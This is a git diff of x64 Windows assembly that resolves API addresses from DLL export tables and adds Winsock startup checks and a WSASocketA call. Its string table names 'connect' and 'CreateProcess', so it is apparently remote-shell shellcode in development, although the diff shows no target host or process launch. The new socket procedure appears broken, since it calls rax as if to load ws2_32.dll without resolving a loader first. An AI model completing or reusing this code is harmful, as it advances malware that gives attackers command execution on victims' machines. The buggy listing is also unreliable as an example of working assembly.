@@ -16,15 +16,29 @@ main proc
     mov r15, rax            ;save for later use with forwarded exports
 
     call startup
+    cmp rax, 0h             ; check result
+    jne exit                ; failed
     
+    call socket             ; setup socket
+    cmp rax, 0h             ; check result
+    jl  exit                ; failed
+    
+    mov [socket_fd], eax    ; save socket fd
+    
+    
+
+cleanup:
+        
+    
+exit:
 
     lea rdx, exitproc_func
     lea rcx, kernel32_dll
     call lookup_api         ;get address of ExitProcess
  
     xor rcx, rcx            ;exit code zero
-    call rax                ;exit
-
+    call rax                ;exit    
+    
     add rsp, 28h
     ret
 
@@ -35,7 +49,7 @@ startup proc
     push rbp
     mov rbp, rsp
 
-    sub rsp, 1c0h           ; allocate space (local 198h + 28h shadow space)
+    sub rsp, 1c0h                   ; allocate space (local 198h for WSADATA + 28h shadow space)
     and rsp, 0fffffffffffffff0h     ;make sure stack 16-byte aligned   B
 
     lea rcx, ws2_32_dll
@@ -48,8 +62,7 @@ startup proc
     lea rdx, [rbp-8]        ; lpWSAData
     mov rcx, 2d             ; wVersionRequired
     call rax                ; WSAStartup
-    int 3
-
+    
     add rsp, 1c0h           ; deallocate stack space
 
     leave
@@ -57,6 +70,40 @@ startup proc
 
 startup endp
 
+socket proc
+
+    push rbp
+    mov rbp, rsp
+    
+    ; allocate space
+     
+    sub rsp, 30h                   ; allocate space (28h shadow + GROUP 4h + dwFlags 4h)
+    and rsp, 0fffffffffffffff0h    ; make sure stack 16-byte aligned   B
+    
+    lea rcx, ws2_32_dll
+    call rax                ;load ws2_32.dll
+    
+    lea rdx, wsa_socketa_func
+    lea rcx, ws2_32_dll
+    call lookup_api         ; get address of WSASocketA
+    
+    xor rbx, rbx
+    mov [rbp-28h], rbx       ; dwFlags
+    mov [rbp-2ch], rbx       ; group 
+    
+    mov r9, 0h              ; lpProtocolInfo
+    mov r8, 6h              ; protocol
+    mov rdx, 1h             ; type
+    mov rcx, 2h             ; af
+    
+    call rax                ; WSASocket
+        
+    add rsp, 30h           ; deallocate stack space
+    
+    leave
+    ret
+
+socket endp
 
 ; required dlls
 kernel32_dll        db  'KERNEL32.DLL', 0
@@ -70,6 +117,9 @@ connect_func        db  'connect', 0
 create_process_func db  'CreateProcess', 0
 exitproc_func       db  'ExitProcess', 0
 ;exitthread_func    db  'ExitThread', 0
+
+; globals
+socket_fd           dd  ?
  
 ;look up address of function from DLL export table
 ;rcx=DLL name string, rdx=function name string
